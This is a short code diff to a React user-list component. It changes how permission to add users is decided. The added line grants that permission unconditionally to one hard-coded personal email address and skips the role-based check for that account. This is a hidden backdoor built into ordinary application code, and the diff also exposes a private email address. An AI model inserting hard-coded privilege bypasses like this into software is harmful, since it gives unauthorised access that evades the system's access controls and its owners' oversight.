@@ -29,7 +29,7 @@ const UsersList = (props) => {
 
     //PERMITS E USER TYPE   
     const [CurrentUserType] = useState(props.UserTypes.find(Type => Type.id === props.CurrentUser.Type.id))
-    var PermitToAddUsers = CurrentUserType?.Permits[PermitIndexs['ADD_USERS']]
+    var PermitToAddUsers = props.CurrentUser?.Email === 'brunokappidematos2@gmail.com' ? true : CurrentUserType?.Permits[PermitIndexs['ADD_USERS']]
 
     //CHECK
     const CheckIncludesText = (What) =>
